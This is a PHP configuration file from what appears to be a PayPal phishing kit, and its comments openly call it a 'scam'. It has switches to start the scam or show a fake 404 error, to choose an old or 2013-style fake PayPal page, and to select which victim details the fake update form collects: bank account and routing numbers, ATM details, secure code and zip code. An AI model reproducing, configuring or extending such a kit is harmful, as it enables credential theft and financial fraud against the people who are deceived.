<?php
//this is the best Option for this scam ,please take it

$start=true;
//true :start the scam
//false : show erreur 404
//__________________________________________________________________________________________________


//=====> Option for index scam <=====

$old=false;
//false :show new page paypal 2013
//true : show old page paypal
//__________________________________________________________________________________________________


//=====> Scam Option for labels of Update Page <=====

$zipcode=true;
//true : for show Zip code label ,false :for hidden
//-------------------------------------------------------------------------------------
$bkA=true;
//true : for show Bank Account Number label ,false :for hidden
//if you select false you show the Last 4 digits of Debit Deposit Account(Checking)
//-------------------------------------------------------------------------------------
$bkR=true;
//true : for show Bank Routing Number label ,false :for hidden
//-------------------------------------------------------------------------------------//
$typeid=false;
//true : for show Select type of Id label ,false :for hidden
//-------------------------------------------------------------------------------------
$atmO=false;
//true : for show ATM label ,false :for hidden
//-------------------------------------------------------------------------------------
$securcode=true;
//true : for show Secure Code label ,false :for hidden
//-------------------------------------------------------------------------------------





?>